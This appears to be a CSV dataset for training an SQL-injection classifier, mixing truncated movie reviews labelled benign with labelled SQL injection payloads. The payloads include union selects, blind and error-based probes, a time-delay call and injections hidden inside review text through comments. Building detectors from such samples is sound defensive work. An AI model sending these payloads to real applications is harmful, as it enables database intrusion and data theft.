Text,Label,type
"Now, this movie is the worst i have ever seen!! It is simply a disaster. I think it's really a sick movie, i just wasted my time watching this cheap crap. I can't believe anyone would produce such a disaster. Such a waste of money and time. Nothing to learn from this movie, it's just a hollow sick evil flick. I don't think they could've make it worse, this movie just earned it's title as the king of lowest crap. The acting is a disaster, the meaning...oh well there is no meaning just a sick pain and sorrow introduced by the suffering child in the end of the movie, and the killing of the wife which again was another dumb blow to this movie. Do yourself a favor, if you actually have so",0,normal
"sELecT Like  (|<'ABcdEfG',UPper@`( ;hEx  (  raNdOmbLoB /( }(SelECT 0o5B9o2X310c1D097)/0x0b0xa   )  $&)    ;
)<  ) ""     &&   [  (  ^(    +( `'TeNG'/*;poxr*/lIke 'tENg",1,sql
"1%'/*This is a pretty good thriller at a nuclear power plant in southern California that was directed by James Bridges and stars Jane Fonda, Jack Lemmon and Michael Douglas. Fonda plays a TV rep*/  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( '%' = '",1,sql
duji 2sq5k6wl7ur24uz sz56x83v27irh1ip2nhvdnyezm 1'+ ( select 'qbdh' where 4006 = 4006 and 7533 = 7533 ) +',1,sql
select  ( case when  ( 1005 = 5996 )  then 1 else 1005* ( select 1005 from master..sysdatabases )  end ) --,1,sql
"1' where 1628=1628;iif(9342=6508,1,1/0)",1,sql
 ( select 2412 =  ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$da/*Spacecamp is a movie that I plan to show my Daughter Julia Ann Ruth Morgan some day. Seeing Joaquin Phoenix in this movie makes you realize how far hes come since playing a Roman Emperor in the film Gladiator. I am*/tabase ) ||'qzvzq'  )  )  ,1,sql
"I really should give this stinker more credit that 1 star, because the film has so many eye-rolling lines that it's almost worth the price of the rental. <br /><br />The acting, if you want to call it that, is so stilted and contrived that it makes Ed Wood's actors appear life like. ""Sammy,"" the lone black character, must be Mimi's husband in real life because he appears in her other films, but he has zero acting ability. His lines are priceless due to his absurd delivery, though I suspect the intention was to create a sympathetic character. His old man make up in her other turkey (""Pushed To The Limit"") is no-budget, junior high school quality, with cotton ball eyebrows and white spray painted hair.<br ",0,normal
"1""   )    )     )   union all select null,null,null--",1,sql
"1%'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( '%' = '",1,sql
" end and   (  (   ( 'hwrs' like 'hwrs--A nice and pleasant movie full of meditteranean sceneries (Cephallonia is a very beautiful greek island) that keeps many of the novel's characteristics. I think that greek sceneries add something special and magical to a movie. One thing i didn't like at all though, is that the main characters, like 'Mandras' an",1,sql
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and ""ulfr"" like ""ulfr",1,sql
"-8735'  )  )   union all select 3262,3262,3262--",1,sql
jpag8dibouemu6btffnc6nfgllm4cmmqej5h6bmd7qc6z5vqtcb332zvcc20zyyw5vd4iocyty1g1aoxyn0bggcjrjlofsy0qxbd1 d qbd5vm3ccs2qklx3i3 3imh849pbruyo9b2c7z5vdbn087e30b293a10jhrx i2pquvhml612lhwn2p7yrp4dfr6bthn6p6o51rnzb1sqnl0c4l8aqh3k7g n458mc9u7g3ou71o7wnik3 6idrsm06qhy55nh6i01oyfvrq6xg3nlutsn8q5q1bxd8 mjx67nds9hcjz39ux4ynuoc0my8jkl8u507egelu8qsrd0pa0evn850rg9hiaewx2ccoc okv1fl 752h8n5tgnsycwiscp2759x61xxuk45dgo7 8z75vyuj6emvham1epknfg9jlf5f4m23miaqker df3fbr8zb24o5nf9pz6gdvopn4jedzor m95zxra h97hwn0kucj8zei5o3pn0uz9315f81z89vslcr4xozs 2brvkoekagedxzkufobtywaqdhur6ohyc9it6mfybd37in8cc1p 3yfd63 t35yicsc06u62u98n3rv5lai23lg5nrokozu1nc 4nh62vjwgq248zdl544 82w k3jx1' and 9970 = 3409,1,sql
"This film was a big disappointment.<br /><br />I take the opposite view of the critics. This is not a case of the material not being up to the level of the actors; here the actors (Bette Davis and James Cagney) are simply not up to the level of the material. Clark Gable and Claudette Colbert were every bit as big as Davis and Cagney, and look how It Happened One Night turned out - an all-time classic. With a very similar story, Davis proves that she has no talent for comedy (good thing for her that this is just about the only comedy she ever attempted!) Davis' one-note performance oozes petulance, but none of the nuances of Colbert's acting in It Happened One Night. Cagney, who was a great comedy actor, just seems out-of-sync with his costar, Davis. The script provides some decent lines and gags, but the delivery seems better suited to drama than comedy.<br /><br />",0,normal
